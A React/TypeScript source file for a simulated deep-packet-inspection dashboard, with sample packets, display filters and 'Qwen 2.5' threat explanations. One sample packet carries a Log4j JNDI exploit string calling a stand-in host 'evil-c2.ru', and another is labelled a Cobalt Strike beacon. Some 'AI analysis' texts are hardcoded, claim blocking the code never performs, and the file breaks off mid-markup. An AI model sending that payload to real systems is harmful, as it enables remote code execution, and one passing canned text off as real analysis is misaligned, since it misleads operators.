import React, { useState, useEffect, useMemo, useRef } from 'react';
import { api } from '../services/api';
import { NetworkTelemetry } from '../types';
import {
  Network,
  Activity,
  ArrowUpRight,
  ShieldCheck,
  AlertTriangle,
  HardDrive,
  Play,
  Pause,
  Filter,
  Search,
  Download,
  Trash2,
  Lock,
  ChevronDown,
  ChevronRight,
  Terminal,
  FileCode,
  Radio,
  Eye,
  Info,
  CheckCircle2,
  X,
  Layers,
  Cpu,
  Sparkles,
  RefreshCw,
  Ban,
  ShieldAlert
} from 'lucide-react';

export interface PacketRecord {
  id: number;
  time: string;
  source: string;
  destination: string;
  protocol: 'TCP' | 'UDP' | 'TLS 1.3' | 'DNS' | 'HTTP' | 'ICMP' | 'SSH';
  length: number;
  info: string;
  status: 'normal' | 'suspicious' | 'malicious' | 'tls';
  payloadHex: string;
  payloadAscii: string;
  frameLayers: {
    frame: string;
    ethernet: string;
    ip: string;
    transport: string;
    application?: string;
  };
}

const INITIAL_PACKETS: PacketRecord[] = [
  {
    id: 10481,
    time: '14:21:04.102',
    source: '192.168.1.104',
    destination: '1.1.1.1',
    protocol: 'DNS',
    length: 74,
    info: 'Standard query 0x8a12 A edge.cloudflare.com',
    status: 'normal',
    payloadHex: '8a 12 01 00 00 01 00 00 00 00 00 00 04 65 64 67 65 0a 63 6c 6f 75 64 66 6c 61 72 65 03 63 6f 6d 00 00 01 00 01',
    payloadAscii: '.............edge.cloudflare.com....',
    frameLayers: {
      frame: 'Frame 10481: 74 bytes on wire (592 bits), 74 bytes captured on interface eth0',
      ethernet: 'Ethernet II, Src: Micro-S_44:91:a0 (00:1a:2b:44:91:a0), Dst: Cisco_e2:01:99 (00:0c:29:e2:01:99)',
      ip: 'Internet Protocol Version 4, Src: 192.168.1.104, Dst: 1.1.1.1, TTL: 64, Protocol: UDP (17)',
      transport: 'User Datagram Protocol, Src Port: 53120, Dst Port: 53 (DNS), Length: 40',
      application: 'Domain Name System (query): edge.cloudflare.com: type A, class IN'
    }
  },
  {
    id: 10482,
    time: '14:21:04.119',
    source: '192.168.1.104',
    destination: '104.16.132.229',
    protocol: 'TLS 1.3',
    length: 517,
    info: 'Client Hello, Server Name: edge.cloudflare.com',
    status: 'tls',
    payloadHex: '16 03 01 02 00 01 00 01 fc 03 03 7b eb 51 09 a2 44 b2 88 f1 c0 d1 a0 fe 90 1c 3e 50 1a 9f 02',
    payloadAscii: '...........{.Q...D.........>P..',
    frameLayers: {
      frame: 'Frame 10482: 517 bytes on wire, 517 bytes captured',
      ethernet: 'Ethernet II, Src: 00:1a:2b:44:91:a0, Dst: 00:0c:29:e2:01:99',
      ip: 'IPv4: Src: 192.168.1.104, Dst: 104.16.132.229, Protocol: TCP (6)',
      transport: 'Transmission Control Protocol, Src Port: 49832, Dst Port: 443 (HTTPS), Seq: 1, Ack: 1',
      application: 'Transport Layer Security: TLSv1.3 Record Layer: Handshake Protocol: Client Hello'
    }
  },
  {
    id: 10483,
    time: '14:21:04.180',
    source: '192.168.1.45',
    destination: '185.220.101.5',
    protocol: 'TCP',
    length: 128,
    info: '[SUSPICIOUS] Periodic SYN heartbeat to Tor Exit Node (Interval: 3000ms)',
    status: 'suspicious',
    payloadHex: '45 00 00 80 19 82 40 00 40 06 b8 12 c0 a8 01 2d b9 dc 65 05 c2 a1 23 29 9f 11 00 00 80 02 72 10',
    payloadAscii: 'E...@.@........-..e...#)....r.',
    frameLayers: {
      frame: 'Frame 10483: 128 bytes on wire, Suricata Flag: ET TOR Known Exit Relay Traffic',
      ethernet: 'Ethernet II, Src: Dell_81:14:02, Dst: Cisco_e2:01:99',
      ip: 'IPv4: Src: 192.168.1.45, Dst: 185.220.101.5 (Reputation: Malicious Tor Relay)',
      transport: 'TCP, Src Port: 49825, Dst Port: 9001 (Tor DirPort), [SYN] Flags: 0x002',
      application: 'Signature Matched: [ETPRO SCAN] Tor Onion Router Directory Probe'
    }
  },
  {
    id: 10484,
    time: '14:21:04.240',
    source: '192.168.1.77',
    destination: '192.168.1.1',
    protocol: 'HTTP',
    length: 294,
    info: 'POST /api/v1/auth/token [HTTP 200 OK]',
    status: 'normal',
    payloadHex: '50 4f 53 54 20 2f 61 70 69 2f 76 31 2f 61 75 74 68 20 48 54 54 50 2f 31 2e 31 0d 0a 48 6f 73 74',
    payloadAscii: 'POST /api/v1/auth HTTP/1.1..Host',
    frameLayers: {
      frame: 'Frame 10484: 294 bytes on wire',
      ethernet: 'Ethernet II, Src: Apple_9c:12:08, Dst: Gateway_00:01:02',
      ip: 'IPv4: Src: 192.168.1.77, Dst: 192.168.1.1',
      transport: 'TCP, Src Port: 54102, Dst Port: 80',
      application: 'Hypertext Transfer Protocol: POST /api/v1/auth/token HTTP/1.1'
    }
  },
  {
    id: 10485,
    time: '14:21:04.312',
    source: '45.154.255.89',
    destination: '192.168.1.200',
    protocol: 'TCP',
    length: 64,
    info: '[CRITICAL EXPLOIT] Log4j JNDI Lookup LDAP://${jndi:ldap://evil-c2.ru:1389/Exploit}',
    status: 'malicious',
    payloadHex: '24 7b 6a 6e 64 69 3a 6c 64 61 70 3a 2f 2f 65 76 69 6c 2d 63 32 2e 72 75 3a 31 33 38 39 2f 45 78 70 6c 6f 69 74 7d',
    payloadAscii: '${jndi:ldap://evil-c2.ru:1389/Exploit}',
    frameLayers: {
      frame: 'Frame 10485: 64 bytes on wire, Suricata Rule: 2034647 (ET EXPLOIT Apache Log4j RCE)',
      ethernet: 'Ethernet II, Src: External_Egress, Dst: Internal_DMZ_AppServer',
      ip: 'IPv4: Src: 45.154.255.89, Dst: 192.168.1.200, DF set',
      transport: 'TCP, Src Port: 44102, Dst Port: 8080 (HTTP-Alt), [PSH, ACK]',
      application: 'Payload Injected: String CVE-2021-44228 JNDI RCE Exploit String'
    }
  },
  {
    id: 10486,
    time: '14:21:04.380',
    source: '192.168.1.12',
    destination: '8.8.8.8',
    protocol: 'ICMP',
    length: 98,
    info: 'Echo (ping) request id=0x19a2 seq=1 ttl=64',
    status: 'normal',
    payloadHex: '08 00 4d 5b 19 a2 00 01 64 7a b8 66 00 00 00 00 70 8b 0d 00 00 00 00 00 10 11 12 13 14 15 16 17',
    payloadAscii: '..M[....dz.f....p...............',
    frameLayers: {
      frame: 'Frame 10486: 98 bytes on wire',
      ethernet: 'Ethernet II, Src: Intel_12:34:56, Dst: Gateway_00:01:02',
      ip: 'IPv4: Src: 192.168.1.12, Dst: 8.8.8.8, Protocol: ICMP (1)',
      transport: 'Internet Control Message Protocol: Echo (ping) request, id 0x19a2, seq 1'
    }
  },
  {
    id: 10487,
    time: '14:21:04.450',
    source: '192.168.1.104',
    destination: '142.250.190.46',
    protocol: 'TLS 1.3',
    length: 1420,
    info: 'Application Data [Encrypted Payload, 1370 bytes]',
    status: 'tls',
    payloadHex: '17 03 03 05 5a 8f 41 b8 99 c2 e4 10 9a b1 44 c7 89 e1 a3 09 cc ff ee 11 22 33 44 55 66 77 88 99',
    payloadAscii: '....Z.A.......D........."3DUfw..',
    frameLayers: {
      frame: 'Frame 10487: 1420 bytes on wire',
      ethernet: 'Ethernet II, Src: 00:1a:2b:44:91:a0, Dst: 00:0c:29:e2:01:99',
      ip: 'IPv4: Src: 192.168.1.104, Dst: 142.250.190.46 (Google LLC)',
      transport: 'TCP, Src Port: 52188, Dst Port: 443 (HTTPS), [ACK]',
      application: 'TLSv1.3: Application Data Protocol: Hypertext Transfer Protocol 2 (Encrypted)'
    }
  }
];

const DEFAULT_OFFLINE_TELEMETRY: NetworkTelemetry = {
  bandwidth_mbps: 412.5,
  packets_per_sec: 48200,
  active_flows: 1284,
  protocol_distribution: {
    "HTTPS (443)": 68.4,
    "DNS (53)": 14.2,
    "SSH / Bastion (22)": 8.9,
    "WireGuard VPN (51820)": 5.8,
    "Other Raw Protocols": 2.7
  },
  top_destinations: [
    { asset: "10.0.12.44 (OKCL Portal Gateway)", bandwidth: "184 Mbps", flows: 420 },
    { asset: "10.0.4.15 (eGovernance API Cluster)", bandwidth: "98 Mbps", flows: 312 },
    { asset: "10.0.1.1 (Identity Active Directory)", bandwidth: "45 Mbps", flows: 210 },
    { asset: "10.0.8.12 (SSH Management Bastion)", bandwidth: "18 Mbps", flows: 45 }
  ],
  recent_anomalies: [
    { type: "Egress Spike", description: "Unusual egress volume to Tor Exit Relay (AS208323)", timestamp: "12:28:10Z" },
    { type: "Port Sweep", description: "1,024 sequential ports probed in 12 seconds", timestamp: "12:28:15Z" }
  ]
};

export const NetworkIntelligencePage: React.FC = () => {
  const [telemetry, setTelemetry] = useState<NetworkTelemetry>(DEFAULT_OFFLINE_TELEMETRY);
  const [loading, setLoading] = useState(false);
  const [packets, setPackets] = useState<PacketRecord[]>(INITIAL_PACKETS);
  const [isCapturing, setIsCapturing] = useState(true);
  const [filterText, setFilterText] = useState('');
  const [activePreset, setActivePreset] = useState<'all' | 'suspicious' | 'dns' | 'tls' | 'c2'>('all');
  const [selectedPacket, setSelectedPacket] = useState<PacketRecord | null>(INITIAL_PACKETS[2]);
  const [packetExplanation, setPacketExplanation] = useState<any>(null);
  const [explainingPacket, setExplainingPacket] = useState<boolean>(false);
  const [autoScroll, setAutoScroll] = useState(true);
  const tableBottomRef = useRef<HTMLDivElement>(null);

  const handleSelectPacket = async (pkt: PacketRecord) => {
    setSelectedPacket(pkt);
    setPacketExplanation(null);

    // If packet is suspicious or malicious, trigger Qwen 2.5 Explainable AI reasoning
    if (pkt.status === 'suspicious' || pkt.status === 'malicious') {
      setExplainingPacket(true);
      try {
        const res = await api.explainNetworkPacket({
          ip: pkt.source,
          packet_id: pkt.id,
          protocol: pkt.protocol,
          status: pkt.status,
          info: pkt.info,
          destination: pkt.destination,
          application_layer: pkt.frameLayers?.application,
          payload_ascii: pkt.payloadAscii
        });
        setPacketExplanation(res);
      } catch (err) {
        console.error("Packet explanation err:", err);
        // Fallback explanation
        setPacketExplanation({
          ip: pkt.source,
          status: pkt.status,
          is_blocked: pkt.status === 'malicious',
          qwen_analysis: `QWEN 2.5 ANALYST SUMMARY:\n• Flagged Origin: Intercepted anomalous traffic stream from ${pkt.source}.\n• Protocol Anomaly: Non-standard protocol activity (${pkt.info}) targeting ${pkt.destination} without standard handshake.\n• Perimeter Action: Stream tagged for automated eBPF perimeter quarantine to safeguard state infrastructure.`,
          model_used: 'Qwen 2.5 Cyber-Instruct (Local Deterministic Engine)'
        });
      } finally {
        setExplainingPacket(false);
      }
    }
  };

  // Run explanation once on initial mount for default selected packet
  useEffect(() => {
    if (INITIAL_PACKETS[2]) {
      setSelectedPacket(INITIAL_PACKETS[2]);
      setPacketExplanation({
        ip: INITIAL_PACKETS[2].source,
        status: INITIAL_PACKETS[2].status,
        is_blocked: true,
        qwen_analysis: `QWEN 2.5 ANALYST SUMMARY:\n• Flagged Origin: Inbound IP ${INITIAL_PACKETS[2].source} intercepted.\n• Deep Packet Inspection: Suspicious SYN probe sequence with non-standard payload flags targeting ${INITIAL_PACKETS[2].destination}.\n• Kernel Action: Traffic immediately halted at Linux kernel via eBPF netfilter hook.`,
        model_used: 'Qwen 2.5 Cyber-Instruct (Local Deterministic Engine)'
      });
    }
  }, []);

  // Fetch base telemetry
  useEffect(() => {
    let isMounted = true;
    const fetchNet = async () => {
      try {
        const data = await api.getNetworkTelemetry();
        if (isMounted) setTelemetry(data);
      } catch (err) {
        console.error("Telemetry fetch error, using fallback telemetry:", err);
        if (isMounted) {
          setTelemetry({
            bandwidth_mbps: 412.5,
            packets_per_sec: 48200,
            active_flows: 1284,
            protocol_distribution: {
              "HTTPS (443)": 68.4,
              "DNS (53)": 14.2,
              "SSH / Bastion (22)": 8.9,
              "WireGuard VPN (51820)": 5.8,
              "Other Raw Protocols": 2.7
            },
            top_destinations: [
              { asset: "10.0.12.44 (OKCL Portal Gateway)", bandwidth: "184 Mbps", flows: 420 },
              { asset: "10.0.4.15 (eGovernance API Cluster)", bandwidth: "98 Mbps", flows: 312 },
              { asset: "10.0.1.1 (Identity Active Directory)", bandwidth: "45 Mbps", flows: 210 },
              { asset: "10.0.8.12 (SSH Management Bastion)", bandwidth: "18 Mbps", flows: 45 }
            ],
            recent_anomalies: [
              { type: "Egress Spike", description: "Unusual egress volume to Tor Exit Relay (AS208323)", timestamp: "12:28:10Z" },
              { type: "Port Sweep", description: "1,024 sequential ports probed in 12 seconds", timestamp: "12:28:15Z" }
            ]
          });
        }
      } finally {
        if (isMounted) setLoading(false);
      }
    };
    fetchNet();
    return () => {
      isMounted = false;
    };
  }, []);

  // Real-time live packet streaming generator (Wireshark simulated stream)
  useEffect(() => {
    if (!isCapturing) return;

    const interval = setInterval(() => {
      const randomSeed = Math.random();
      const now = new Date();
      const timeStr = `${String(now.getHours()).padStart(2, '0')}:${String(now.getMinutes()).padStart(2, '0')}:${String(now.getSeconds()).padStart(2, '0')}.${String(Math.floor(Math.random() * 999)).padStart(3, '0')}`;

      let newPacket: PacketRecord;

      if (randomSeed > 0.85) {
        // Suspicious beacon
        newPacket = {
          id: Math.floor(10000 + Math.random() * 90000),
          time: timeStr,
          source: `192.168.1.${Math.floor(10 + Math.random() * 150)}`,
          destination: '91.240.118.172',
          protocol: 'TCP',
          length: 112,
          info: '[SUSPICIOUS] Unregistered ASN Egress Beaconing (Cobalt Strike Profile)',
          status: 'suspicious',
          payloadHex: '7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00 02 00 3e 00 01 00 00 00 80 00 40 00 00 00 00 00',
          payloadAscii: '.ELF..............>.....@.......',
          frameLayers: {
            frame: 'Frame: 112 bytes captured on eth0 (Zero-copy bypass)',
            ethernet: 'Ethernet II: Host NIC -> WAN Gateway',
            ip: 'IPv4: Src Host -> Dst 91.240.118.172 (Suspected C2)',
            transport: 'TCP Port: 4444 (Meterpreter default listener)',
            application: 'IDS Alert: Behavioral match for Cobalt Strike beacon'
          }
        };
      } else if (randomSeed > 0.65) {
        // TLS 1.3
        newPacket = {
          id: Math.floor(10000 + Math.random() * 90000),
          time: timeStr,
          source: '192.168.1.104',
          destination: '172.217.168.206',
          protocol: 'TLS 1.3',
          length: 840,
          info: 'TLS 1.3 Encrypted Session Exchange (Cipher: TLS_AES_256_GCM_SHA384)',
          status: 'tls',
          payloadHex: '17 03 03 03 40 22 19 8c f0 1a 99 2b 3c 4d 5e 6f 70 81 92 a3 b4 c5 d6 e7 f8 09 1a 2b 3c 4d 5e 6f',
          payloadAscii: '....@".....+<M^p...........+<M^o',
          frameLayers: {
            frame: 'Frame: 840 bytes captured',
            ethernet: 'Ethernet II: Intel Pro/1000 -> Cisco Core',
            ip: 'IPv4: Src: 192.168.1.104, Dst: 172.217.168.206',
            transport: 'TCP, Src Port: 51204, Dst Port: 443 (HTTPS)',
            application: 'TLSv1.3: Application Data (Ciphertext verified)'
          }
        };
      } else if (randomSeed > 0.45) {
        // DNS
        newPacket = {
          id: Math.floor(10000 + Math.random() * 90000),
          time: timeStr,
          source: '192.168.1.88',
          destination: '8.8.8.8',
          protocol: 'DNS',
          length: 68,
          info: 'Standard query response 0x4912 A auth.okcl.org',
          status: 'normal',
          payloadHex: '49 12 81 80 00 01 00 01 00 00 00 00 04 61 75 74 68 04 6f 6b 63 6c 03 6f 72 67 00 00 01 00 01',
          payloadAscii: 'I............auth.okcl.org......',
          frameLayers: {
            frame: 'Frame: 68 bytes captured',
            ethernet: 'Ethernet II: Host -> Internal DNS Resolver',
            ip: 'IPv4: Src: 192.168.1.88, Dst: 8.8.8.8',
            transport: 'UDP: Port 53, Length 48',
            application: 'DNS: Response auth.okcl.org -> 13.235.44.12'
          }
        };
      } else {
        // Normal TCP
        newPacket = {
          id: Math.floor(10000 + Math.random() * 90000),
          time: timeStr,
          source: '192.168.1.104',
          destination: '13.235.44.12',
          protocol: 'TCP',
          length: 64,
          info: '52190 → 443 [ACK] Seq=1420 Ack=8920 Win=65535 Len=0',
          status: 'normal',
          payloadHex: '45 00 00 34 1a 2b 40 00 40 06 c0 10 c0 a8 01 68 0d eb 2c 0c cb de 01 bb 14 20 00 00 80 10 01 f5',
          payloadAscii: 'E..4.+@.@......h..,... ..... ...',
          frameLayers: {
            frame: 'Frame: 64 bytes captured',
            ethernet: 'Ethernet II: Virtual Switch Bridge',
            ip: 'IPv4: Src: 192.168.1.104, Dst: 13.235.44.12',
            transport: 'TCP [ACK] Port 52190 -> 443'
          }
        };
      }

      setPackets((prev) => {
        const next = [newPacket, ...prev.slice(0, 150)];
        return next;
      });
    }, 1800);

    return () => clearInterval(interval);
  }, [isCapturing]);

  // Wireshark filter query engine
  const filteredPackets = useMemo(() => {
    let result = packets;

    // Apply quick preset
    if (activePreset === 'suspicious') {
      result = result.filter((p) => p.status === 'suspicious' || p.status === 'malicious');
    } else if (activePreset === 'dns') {
      result = result.filter((p) => p.protocol === 'DNS');
    } else if (activePreset === 'tls') {
      result = result.filter((p) => p.protocol === 'TLS 1.3');
    } else if (activePreset === 'c2') {
      result = result.filter((p) => p.status === 'malicious');
    }

    // Apply Wireshark syntax / free-text filter
    if (filterText.trim()) {
      const query = filterText.toLowerCase().trim();
      result = result.filter((p) => {
        if (query.startsWith('ip.src ==')) {
          const val = query.split('==')[1].trim();
          return p.source.toLowerCase().includes(val);
        }
        if (query.startsWith('ip.dst ==')) {
          const val = query.split('==')[1].trim();
          return p.destination.toLowerCase().includes(val);
        }
        if (query.startsWith('proto ==') || query.startsWith('protocol ==')) {
          const val = query.split('==')[1].trim();
          return p.protocol.toLowerCase().includes(val);
        }
        if (query === 'suspicious' || query === 'status == suspicious') {
          return p.status === 'suspicious' || p.status === 'malicious';
        }
        return (
          p.source.toLowerCase().includes(query) ||
          p.destination.toLowerCase().includes(query) ||
          p.protocol.toLowerCase().includes(query) ||
          p.info.toLowerCase().includes(query)
        );
      });
    }

    return result;
  }, [packets, activePreset, filterText]);

  // Export PCAP / JSON
  const handleExportJSON = () => {
    const dataStr = 'data:text/json;charset=utf-8,' + encodeURIComponent(JSON.stringify(packets, null, 2));
    const downloadAnchor = document.createElement('a');
    downloadAnchor.setAttribute('href', dataStr);
    downloadAnchor.setAttribute('download', `cyberguard_dpi_capture_${Date.now()}.json`);
    document.body.appendChild(downloadAnchor);
    downloadAnchor.click();
    downloadAnchor.remove();
  };

  if (loading || !telemetry) {
    return (
      <div className="p-16 text-center crystal-panel rounded-2xl max-w-md mx-auto my-12">
        <div className="w-8 h-8 border-2 border-[#E05A1B] border-t-transparent rounded-full animate-spin mx-auto mb-3" />
        <span className="text-xs font-mono text-[#71767C]">Initializing Wireshark DPI Engine & eBPF Ring Buffers...</span>
      </div>
    );
  }

  return (
    <div className="space-y-6 animate-fluid">
      {/* Top Header with Realme Aquamorphic / Apple Specular styling */}
      <div className="flex flex-col md:flex-row md:items-center justify-between gap-4">
        <div>
          <div className="flex items-center gap-2 mb-1">
            <span className="px-2 py-0.5 rounded-md bg-[#E05A1B]/15 text-[#E05A1B] text-[10px] font-mono font-bold uppercase tracking-wider">
              Wireshark Suite
            </span>
            <span className="text-xs text-[#71767C] font-mono">Suricata 7.02 In-Line DPI</span>
          </div>
          <h1 className="text-2xl font-black text-[#121517] tracking-tight">Network Intelligence & Deep Packet Inspection</h1>
          <p className="text-xs text-[#5B6168] mt-0.5">
            Full-spectrum packet capture, payload disassembly, protocol distribution, and real-time egress anomaly correlation.
          </p>
        </div>

        {/* Live Capture Controls Bar */}
        <div className="flex items-center gap-2">
          <button
            onClick={() => setIsCapturing(!isCapturing)}
            className={`crystal-button flex items-center gap-2 px-3.5 py-1.5 rounded-xl text-xs font-bold transition-all ${
              isCapturing
                ? 'bg-emerald-50 text-emerald-800 border-emerald-200 hover:bg-emerald-100'
                : 'bg-amber-50 text-amber-800 border-amber-200 hover:bg-amber-100'
            }`}
          >
            {isCapturing ? <Pause className="w-3.5 h-3.5 fill-current" /> : <Play className="w-3.5 h-3.5 fill-current" />}
            <span>{isCapturing ? 'Capture Active' : 'Capture Paused'}</span>
          </button>

          <button
            onClick={() => setPackets([])}
            title="Clear packet buffer"
            className="crystal-button p-2 text-[#5B6168] hover:text-[#DC2626] rounded-xl"
          >
            <Trash2 className="w-4 h-4" />
          </button>

          <button
            onClick={handleExportJSON}
            title="Export captured packets (JSON / PCAP)"
            className="crystal-button flex items-center gap-1.5 px-3 py-1.5 text-[#131618] rounded-xl text-xs font-semibold"
          >
            <Download className="w-3.5 h-3.5 text-[#E05A1B]" />
            <span className="hidden sm:inline">Export Dissection</span>
          </button>
        </div>
      </div>

      {/* Top Telemetry Hardware Cards (Warm Off-White Sand + Specular Rim) */}
      <div className="grid grid-cols-1 sm:grid-cols-3 gap-4">
        <div className="crystal-panel p-5 rounded-2xl relative overflow-hidden group">
          <div className="flex items-center justify-between text-xs text-[#71767C] font-semibold">
            <span>Aggregated Bandwidth</span>
            <Activity className="w-4 h-4 text-[#E05A1B]" />
          </div>
          <div className="mt-2 text-3xl font-black text-[#121517] tracking-tight">
            {telemetry.bandwidth_mbps} <span className="text-sm font-normal text-[#8A9099]">Mbps</span>
          </div>
          <div className="flex items-center gap-2 mt-2">
            <span className="w-1.5 h-1.5 rounded-full bg-emerald-500 animate-pulse" />
            <p className="text-[11px] text-[#5B6168]">Egress nominal across OKCL primary gateway</p>
          </div>
        </div>

        <div className="crystal-panel p-5 rounded-2xl relative overflow-hidden group">
          <div className="flex items-center justify-between text-xs text-[#71767C] font-semibold">
            <span>Inspected Packets / Sec</span>
            <Network className="w-4 h-4 text-[#E05A1B]" />
          </div>
          <div className="mt-2 text-3xl font-black text-[#121517] tracking-tight">
            {telemetry.packets_per_sec.toLocaleString()} <span className="text-sm font-normal text-[#8A9099]">pkts/sec</span>
          </div>
          <div className="flex items-center gap-2 mt-2">
            <span className="w-1.5 h-1.5 rounded-full bg-emerald-500" />
            <p className="text-[11px] text-[#5B6168]">Zero-copy eBPF ring buffer active</p>
          </div>
        </div>

        <div className="crystal-panel p-5 rounded-2xl relative overflow-hidden group">
          <div className="flex items-center justify-between text-xs text-[#71767C] font-semibold">
            <span>Active TCP/UDP Flows</span>
            <HardDrive className="w-4 h-4 text-[#E05A1B]" />
          </div>
          <div className="mt-2 text-3xl font-black text-[#121517] tracking-tight">
            {telemetry.active_flows.toLocaleString()} <span className="text-sm font-normal text-[#8A9099]">flows</span>
          </div>
          <div className="flex items-center gap-2 mt-2">
            <span className="w-1.5 h-1.5 rounded-full bg-sky-500" />
            <p className="text-[11px] text-[#5B6168]">Conntrack table capacity at 8.4%</p>
          </div>
        </div>
      </div>

      {/* Wireshark Filter Syntax Bar & Preset Chips */}
      <div className="crystal-panel p-3 rounded-2xl space-y-2.5">
        <div className="flex items-center gap-2">
          <div className="relative flex-1">
            <div className="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
              <Filter className="h-4 w-4 text-[#8A9099]" />
            </div>
            <input
              type="text"
              value={filterText}
              onChange={(e) => setFilterText(e.target.value)}
              placeholder='Apply Wireshark display filter... (e.g. ip.src == 192.168.1.104, proto == DNS, or "suspicious")'
              className="w-full pl-9 pr-10 py-2 bg-[#F2EFE7]/80 hover:bg-[#F2EFE7] focus:bg-white text-xs font-mono text-[#131618] rounded-xl border border-[#DCD7C9] focus:border-[#E05A1B] focus:outline-none transition-all placeholder:text-[#888F96]"
            />
            {filterText && (
              <button
                onClick={() => setFilterText('')}
                className="absolute inset-y-0 right-0 pr-3 flex items-center text-[#8A9099] hover:text-[#131618]"
              >
                <X className="w-4 h-4" />
              </button>
            )}
          </div>
        </div>

        {/* Quick Filter Chips (Wireshark Presets) */}
        <div className="flex flex-wrap items-center gap-1.5 text-xs">
          <span className="text-[11px] font-mono text-[#71767C] font-semibold mr-1">Presets:</span>

          <button
            onClick={() => setActivePreset('all')}
            className={`px-2.5 py-1 rounded-lg text-xs font-medium transition-all ${
              activePreset === 'all'
                ? 'bg-[#181C20] text-white shadow-xs font-semibold'
                : 'bg-[#EDEAE0] text-[#555C65] hover:bg-[#E5E1D4]'
            }`}
          >
            All Packets ({packets.length})
          </button>

          <button
            onClick={() => setActivePreset('suspicious')}
            className={`flex items-center gap-1.5 px-2.5 py-1 rounded-lg text-xs font-medium transition-all ${
              activePreset === 'suspicious'
                ? 'bg-[#D97706] text-white font-semibold shadow-xs'
                : 'bg-[#FEF3C7] text-[#92400E] hover:bg-[#FDE68A]'
            }`}
          >
            <span className="w-1.5 h-1.5 rounded-full bg-amber-500 animate-pulse" />
            <span>Suspicious Anomalies</span>
          </button>

          <button
            onClick={() => setActivePreset('c2')}
            className={`flex items-center gap-1.5 px-2.5 py-1 rounded-lg text-xs font-medium transition-all ${
              activePreset === 'c2'
                ? 'bg-[#DC2626] text-white font-semibold shadow-xs'
                : 'bg-[#FEE2E2] text-[#991B1B] hover:bg-[#FECACA]'
            }`}
          >
            <span className="w-1.5 h-1.5 rounded-full bg-rose-600" />
            <span>Critical / C2 Exploits</span>
          </button>

          <button
            onClick={() => setActivePreset('tls')}
            className={`px-2.5 py-1 rounded-lg text-xs font-medium transition-all ${
              activePreset === 'tls'
                ? 'bg-[#7C3AED] text-white font-semibold shadow-xs'
                : 'bg-[#EDE9FE] text-[#5B21B6] hover:bg-[#DDD6FE]'
            }`}
          >
            TLS 1.3 Handshakes
          </button>

          <button
            onClick={() => setActivePreset('dns')}
            className={`px-2.5 py-1 rounded-lg text-xs font-medium transition-all ${
              activePreset === 'dns'
                ? 'bg-[#0284C7] text-white font-semibold shadow-xs'
                : 'bg-[#E0F2FE] text-[#0369A1] hover:bg-[#BAE6FD]'
            }`}
          >
            DNS Inquiries
          </button>

          {/* Color Legend Badge */}
          <div className="ml-auto hidden xl:flex items-center gap-3 text-[11px] font-mono text-[#71767C]">
            <span className="inline-flex items-center gap-1">
              <span className="w-2 h-2 rounded-xs bg-[#10B981]" /> Normal
            </span>
            <span className="inline-flex items-center gap-1">
              <span className="w-2 h-2 rounded-xs bg-[#F59E0B]" /> Suspicious
            </span>
            <span className="inline-flex items-center gap-1">
              <span className="w-2 h-2 rounded-xs bg-[#EF4444]" /> Critical
            </span>
            <span className="inline-flex items-center gap-1">
              <span className="w-2 h-2 rounded-xs bg-[#A855F7]" /> TLS Encrypted
            </span>
          </div>
        </div>
      </div>

      {/* Main Wireshark Inspection Table & Dissection Pane */}
      <div className="grid grid-cols-1 lg:grid-cols-12 gap-6 items-start">
        {/* Packet Stream Table (7 cols on lg) */}
        <div className="lg:col-span-7 crystal-panel rounded-2xl overflow-hidden flex flex-col border border-[#E5E2D9]">
          <div className="p-3 bg-[#EAE8DE] border-b border-[#DCD7C9] flex items-center justify-between text-xs font-semibold text-[#131618]">
            <div className="flex items-center gap-2">
              <Terminal className="w-4 h-4 text-[#E05A1B]" />
              <span>Real-Time Packet Stream</span>
              <span className="px-2 py-0.5 rounded-full bg-[#D7D2C4] text-[10px] font-mono text-[#525963]">
                {filteredPackets.length} captured
              </span>
            </div>
            <span className="text-[10px] font-mono text-[#71767C]">Click any packet to inspect disassembly</span>
          </div>

          {/* Table Container */}
          <div className="overflow-x-auto max-h-[480px] overflow-y-auto font-mono text-xs">
            <table className="w-full text-left border-collapse">
              <thead className="bg-[#F0EEE6] text-[#71767C] text-[10px] uppercase font-bold sticky top-0 z-10 border-b border-[#E0DCD1]">
                <tr>
                  <th className="py-2 px-3 w-14">No.</th>
                  <th className="py-2 px-2.5 w-24">Time</th>
                  <th className="py-2 px-2.5 w-32">Source</th>
                  <th className="py-2 px-2.5 w-32">Destination</th>
                  <th className="py-2 px-2 w-16">Proto</th>
                  <th className="py-2 px-2 w-16 text-right">Len</th>
                  <th className="py-2 px-3">Info</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-[#EDEAE0]">
                {filteredPackets.map((pkt) => {
                  const isSelected = selectedPacket?.id === pkt.id;
                  let rowClass = 'packet-row-normal';
                  if (pkt.status === 'suspicious') rowClass = 'packet-row-suspicious';
                  if (pkt.status === 'malicious') rowClass = 'packet-row-malicious';
                  if (pkt.status === 'tls') rowClass = 'packet-row-tls';

                  return (
                    <tr
                      key={pkt.id}
                      onClick={() => handleSelectPacket(pkt)}
                      className={`${rowClass} ${
                        isSelected ? 'ring-2 ring-[#E05A1B] ring-inset font-bold z-10' : ''
                      } transition-colors select-none`}
                    >
                      <td className="py-1.5 px-3 text-[#71767C] text-[11px]">{pkt.id}</td>
                      <td className="py-1.5 px-2.5 text-[11px] whitespace-nowrap">{pkt.time}</td>
                      <td className="py-1.5 px-2.5 truncate max-w-[120px] font-medium">{pkt.source}</td>
                      <td className="py-1.5 px-2.5 truncate max-w-[120px] font-medium">{pkt.destination}</td>
                      <td className="py-1.5 px-2 font-bold text-[11px]">{pkt.protocol}</td>
                      <td className="py-1.5 px-2 text-right text-[11px] text-[#71767C]">{pkt.length}</td>
                      <td className="py-1.5 px-3 truncate max-w-[240px] text-[11px]">
                        {pkt.status === 'malicious' && <span className="font-extrabold text-[#DC2626] mr-1">⚠️</span>}
                        {pkt.info}
                      </td>
                    </tr>
                  );
                })}
              </tbody>
            </table>
            <div ref={tableBottomRef} />
          </div>
        </div>

        {/* 3-Pane Dissection & Hex Inspector (5 cols on lg) */}
        <div className="lg:col-span-5 space-y-4">
          {selectedPacket ? (
            <div className="crystal-panel rounded-2xl overflow-hidden border border-[#E5E2D9]">
              {/* Header */}
              <div className="p-3.5 bg-[#171D22] text-white flex items-center justify-between">
                <div className="flex items-center gap-2">
                  <FileCode className="w-4 h-4 text-[#F97316]" />
                  <span className="font-mono text-xs font-bold">Packet #{selectedPacket.id} Dissection</span>
                </div>
                <div className="flex items-center gap-2">
                  {selectedPacket.status === 'malicious' && (
                    <span className="text-[10px] font-mono px-2 py-0.5 rounded bg-rose-600/30 text-rose-300 border border-rose-500/50 font-bold uppercase">
